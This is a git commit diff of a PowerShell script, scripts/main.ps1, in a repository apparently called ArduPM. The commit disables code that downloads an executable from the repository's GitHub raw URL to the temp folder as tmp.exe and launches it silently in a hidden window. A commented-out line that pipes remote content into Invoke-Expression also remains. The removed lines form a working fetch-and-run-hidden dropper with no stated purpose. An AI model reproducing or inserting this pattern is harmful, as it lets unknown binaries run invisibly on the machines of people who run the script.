f8775562ededb2a9e59b029fd158513e494ca1b9
MiHaniKo <139514821+NotiLo-A@users.noreply.github.com>
2025-07-14 00:34:29 +0300

    Update main.ps1

--- scripts/main.ps1
+++ scripts/main.ps1
@@ -1,8 +1,8 @@
 #Invoke-Expression (Invoke-WebRequest -Uri "https://raw.githubusercontent.com/NotiLo-A/ArduPM/main/bin/hello.exe")
 
-$url = "https://raw.githubusercontent.com/NotiLo-A/ArduPM/main/bin/open200.exe"
+#$url = "https://raw.githubusercontent.com/NotiLo-A/ArduPM/main/bin/open200.exe"
 $output = "$env:TEMP\tmp.exe"
 Invoke-WebRequest -Uri $url -OutFile $output
 
-$wshell = New-Object -ComObject WScript.Shell
-$wshell.Run($output, 0, $false)
+#$wshell = New-Object -ComObject WScript.Shell
+#$wshell.Run($output, 0, $false)
